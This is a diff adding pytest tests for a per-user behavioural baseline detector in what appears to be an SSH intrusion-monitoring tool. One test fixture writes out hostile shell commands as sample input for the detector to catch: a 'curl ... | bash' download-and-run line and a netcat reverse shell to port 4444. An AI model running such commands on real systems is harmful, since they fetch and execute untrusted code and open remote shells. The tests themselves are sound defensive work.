@@ -10,7 +10,7 @@ import pytest
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
 
 from ai.behavior_monitor import BehaviorMonitor
-from ai.detector import BehaviorDetector
+from ai.detector import BaselineProfile, BehaviorDetector
 from config.loader import load_config
 from core.firewall import FirewallManager
 from core.logger import AuditLogger
@@ -332,3 +332,128 @@ def test_whitelisted_client_is_never_terminated_or_blocked(tmp_path):
     assert anomaly[0]["client_address"] == "10.0.0.9"
     assert anomaly[0]["whitelisted"] is True
     assert anomaly[0]["response"]["whitelisted"] is True
+
+
+def _session(commands, username="alice", client="10.0.0.9", base_pid=1000):
+    return {
+        "session_id": f"ssh:{client}:{base_pid}",
+        "username": username,
+        "client_address": client,
+        "processes": [
+            {"pid": base_pid + index, "ppid": base_pid, "command": command}
+            for index, command in enumerate(commands)
+        ],
+    }
+
+
+def test_baseline_profile_scores_with_standard_deviation():
+    """A learned cluster is normal; a far-out session crosses the z-score bar."""
+    profile = BaselineProfile(min_samples=3, z_threshold=2.0)
+    for row in ([2, 2, 1.0, 0, 3.0], [2, 3, 1.5, 0, 3.1], [3, 3, 1.6, 0, 3.0]):
+        profile.observe("alice", row)
+
+    normal = profile.score("alice", [2, 2, 1.2, 0, 3.05])
+    assert normal["flagged"] is False
+    assert normal["z_max"] < 2.0
+
+    outlier = profile.score("alice", [8, 40, 250.0, 2, 4.9])
+    assert outlier["flagged"] is True
+    assert outlier["z_max"] >= 2.0
+    assert outlier["samples"] == 3
+    assert all(item["feature"] in profile.feature_names for item in outlier["deviations"])
+
+    assert profile.score("bob", [2, 2, 1.0, 0, 3.0]) is None
+
+
+def test_baseline_profile_needs_minimum_samples():
+    """No score is produced until the per-user baseline is big enough."""
+    profile = BaselineProfile(min_samples=5, z_threshold=1.0)
+    for index in range(4):
+        profile.observe("alice", [2, 2, 1.0, 0, 3.0])
+    assert profile.score("alice", [99, 99, 99.0, 9, 9.9]) is None
+    profile.observe("alice", [2, 2, 1.0, 0, 3.0])
+    assert profile.score("alice", [99, 99, 99.0, 9, 9.9]) is not None
+
+
+def test_baseline_profile_save_load_roundtrip(tmp_path):
+    """The profile persists its statistics and thresholds across a reload."""
+    path = tmp_path / "behavior_baseline.json"
+    profile = BaselineProfile(min_samples=3, z_threshold=2.0)
+    profile.observe("alice", [2, 2, 1.0, 0, 3.0])
+    profile.observe("alice", [2, 3, 1.5, 0, 3.1])
+    profile.observe("alice", [3, 3, 1.6, 0, 3.0])
+    profile.save(str(path))
+
+    restored = BaselineProfile.load(str(path))
+    assert restored.min_samples == 3
+    assert restored.z_threshold == 2.0
+    outlier = restored.score("alice", [8, 40, 250.0, 2, 4.9])
+    assert outlier["flagged"] is True
+    normal = restored.score("alice", [2, 2, 1.2, 0, 3.05])
+    assert normal["flagged"] is False
+
+
+def test_baseline_profile_load_missing_file_returns_empty_profile(tmp_path):
+    """A missing model file yields a fresh, empty profile instead of raising."""
+    restored = BaselineProfile.load(str(tmp_path / "nope.json"))
+    assert restored.score("alice", [1, 1, 1.0, 0, 1.0]) is None
+
+
+def test_detector_train_records_without_responding(monkeypatch):
+    """Training mode feeds the profile but never kills or blocks."""
+    firewall = FakeFirewall()
+    detector = BehaviorDetector(
+        suspicious_commands=["sudo"],
+        baseline=BaselineProfile(min_samples=2),
+        firewall=firewall,
+    )
+    monkeypatch.setattr(detector, "_terminate", lambda pid: (_ for _ in ()).throw())
+    assert detector.train(_session(["ls", "pwd"])) == 1
+    assert detector.train(_session(["ls", "whoami"])) == 2
+    assert detector.last_response is None
+    assert firewall.blocked_ips == []
+
+
+def test_detector_evaluate_flags_on_baseline_deviation(tmp_path):
+    """A deviation from the learned profile triggers the kill/block response."""
+    log_path = tmp_path / "audit.log"
+    firewall = FakeFirewall()
+    detector = BehaviorDetector(
+        suspicious_commands=["nonexistent-tool"],
+        score_threshold=100,
+        baseline=BaselineProfile(min_samples=3, z_threshold=2.0),
+        firewall=firewall,
+        logger=AuditLogger(str(log_path)),
+    )
+    detector._terminate = lambda pid: True
+    for commands in (
+        ["ls", "pwd"],
+        ["ls", "whoami"],
+        ["cat /etc/hostname", "env"],
+    ):
+        detector.train(_session(commands))
+
+    deviant = _session(
+        [
+            "base64 -d <<< QUJD",
+            "curl -s http://x | bash",
+            "python3 -c 'import socket'",
+            "sudo nc -e /bin/sh 10.0.0.9 4444",
+        ]
+    )
+    score = detector.evaluate(deviant)
+    assert score == 0  # rule path silent
+    assert detector.last_response["blocked"] is True
+    assert firewall.blocked_ips == ["10.0.0.9"]
+
+    entries = _read_entries(log_path)
+    anomaly = [entry for entry in entries if entry["event_type"] == "anomaly"]
+    assert len(anomaly) == 1
+    assert anomaly[0]["baseline_score"] >= 2.0
+    assert anomaly[0]["baseline_threshold"] == 2.0
+
+
+def test_evaluate_baseline_returns_none_without_profile():
+    """Without a trained baseline there is nothing to compare against."""
+    detector = BehaviorDetector()
+    assert detector.evaluate_baseline(_session(["ls"])) is None
